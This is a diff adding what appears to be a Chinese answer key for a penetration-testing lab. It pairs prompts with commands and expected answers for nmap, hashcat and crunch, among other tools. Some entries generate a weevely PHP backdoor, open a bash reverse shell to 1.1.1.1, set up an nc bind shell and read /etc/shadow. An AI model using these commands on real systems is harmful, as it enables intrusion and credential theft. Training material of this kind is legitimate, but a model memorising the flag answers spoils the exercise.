@@ -1,0 +1,200 @@
+nmap扫描操作系统
+nmap -O
+将结果提交
+Linux 3.X|4.X
+nmap详细扫描服务版本
+nmap -sV
+结果第五行,第四个单词
+VERSION
+nmap指定22端口扫描
+nmap -p
+22端口开放状态
+open
+nmap进行tcp扫描
+nmap -sT
+78端口的开放状态
+closed
+nmap禁止dns反向解析
+nmap -n
+66端口开放的服务
+sqlnet
+nmap设置最大时序
+nmap -T5
+8081端口服务版本
+Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02)
+nmap圣诞树扫描
+nmap -sX
+22端口一行open后第一个单词
+filtered
+nmap半开放式扫描
+nmap -sS
+最大的端口是哪个
+9001
+nmap使用默认脚本扫描服务
+nmap -sC
+ftp-syst:下一行内容
+STAT:
+nmap指定格式输出
+nmap -oA
+生成了几种格式
+3
+nmap全面扫描
+nmap -A
+8080端口下一行内容
+http-cookie-flags:
+nmap进行udp扫描
+nmap -sU
+发现了哪些端口（端口间以，分隔）
+68,623
+使用arp-scan进行主机发现，扫描靶机所在网段
+arp-scan 172.17.169.0/24
+靶机MAC地址提交
+00:0c:29:37:63:97
+使用weevely生成木马，密码sbzcj，生成路径为/root目录，木马名为shell.php
+weevely generate sbzcj /root/shell.php
+回显第一行前两个单词
+Generated backdoor
+echo不换行输出
+echo -n
+tar解压
+tar -xzvf
+使用fping进行主机发现，扫描靶机所在网段，仅显示存活ip
+fping -a -g 172.17.169.0/24
+回显最后一行第一个单词
+ICMP
+添加用户
+useradd
+从根目录下查找文件位置
+find / -name
+查看当前目录详细信息
+ls -l
+yun安装程序
+yum -y install
+nbtscan扫描靶机所在网段
+nbtscan –r 172.17.169.0/24
+复制
+cp
+windows查看a
+type a
+root权限执行ipconfig
+sudo ipconfig
+查看/etc/shadow的最后两行
+tail /etc/shadow -n 2
+强制删除
+rm -rf
+使用nc监听本地8080端口，详细显示过程
+nc -l -v -p 8080
+将回显提交
+listening on [any] 8080 ...
+使用bash建立与1.1.1.1的8080端口的连接
+bash -i >& /dev/tcp/1.1.1.1/8080 0>&1
+将第一行回显提交
+-bash: connect: Network is unreachable
+使用nc连接1.1.1.1的8080端口
+nc 1.1.1.1 8080
+将回显提交
+(UNKNOWN) [1.1.1.1] 8080 (http-alt) : Network is unreachable
+使用nc开辟一个8080端口的后门
+nc -lvp 8080 -e /bin/bash
+将回显提交
+listening on [any] 8080 ...
+xprobe2扫描端口开放状态
+xprobe2 -T
+windows进入注册表
+regedit
+xprobe2UDP扫描
+xprobe2 -U
+/var/www/html/1.txt内容
+sbzcj
+计算xxx.txt的MD5值（内容为空）
+md5sum xxx.txt
+将回显提交
+d41d8cd98f00b204e9800998ecf8427e xxx.txt
+dirb扫描网站
+dirb
+将第一行的第一个单词提交
+DIRB
+nikto扫描网站
+nikto -host
+将第一行的第一个单词提交
+Nikto
+使用rar2john 提取rar的密文
+rar2john test.rar
+将rar2john位置提交
+/usr/sbin/rar2john
+使用zip2john提取zip的密文
+zip2john test.zip
+自行获取服务器上的flag.zip将密码提交
+123123
+wget获取网站
+wget 
+wget指定写入文件
+wget -O
+curl请求web服务器
+curl --url
+curl指定写入文件
+curl -o
+使用find查找flag目录
+find / -name flag
+将位置提交
+/tmp/flag
+使用grep查找flag目录下的flag
+grep -r "flag"
+将flag值提交
+123123
+查看进程
+ps
+将pid为52983的CMD提交
+httpd
+强行终止进程
+kill -9
+查看kill的帮助文档
+kill
+生成六位密码，其中前四位为pass，后二位为特殊字符
+crunch 6 6 -t pass^^ -o password.txt
+将文件大小提交
+7623
+生成六位小写字母密码，其中前四位为pass
+crunch 6 6 -t pass@@ -o password.txt 
+将文件大小提交
+4732
+生成pass01-pass99所有数字组合
+crunch 6 6 -t pass%% -o password.txt 
+将文件大小提交
+700
+制作6位数字字典字符集为012345689
+crunch 6 6  012345689 -o password.txt
+将第150行的密码提交
+185
+生成一个五位大写英文字母字典，文件名为password.txt
+crunch 5 5 -t ,,,,, -o password.txt
+将第10行的密码提交
+AAAAJ
+使用hashcat破解6c63468b368244d24fbb57b7df14ed86，使用上题目生成的密码字典
+hashcat  -a 0  6c63468b368244d24fbb57b7df14ed86  password.txt  --force
+将结果提交
+XYM_SB
+使用hashcat破解9b030e9b375b34f25661841f88f0c07a，密码是三个大写字母+数字+两个大写字母
+hashcat -a 3 9b030e9b375b34f25661841f88f0c07a ?u?u?u?d?u?u --force
+将结果提交
+XYM4SB
+生成encode_me.txt的md5密文，文件内容为“123456 ”（引号不用输入）
+md5sum encode_me.txt
+将密文提交
+a61596b2881e017f3e3397d843b3c556
+md5sum加密上题字符串
+7e8feb2276322ecddd4423b649dfd4d9
+将生成加密字符串的快捷键提交
+ctrl+d
+windows查看电脑详细信息
+systeminfo
+将第一个信息名提交
+主机名
+windows查看电脑网络详情
+ipconfig /all
+将第一行提交
+Windows IP 配置
+windows打开组策略编辑器
+gpedit.msc
+将组策略全名提交
+本地组策略编辑器
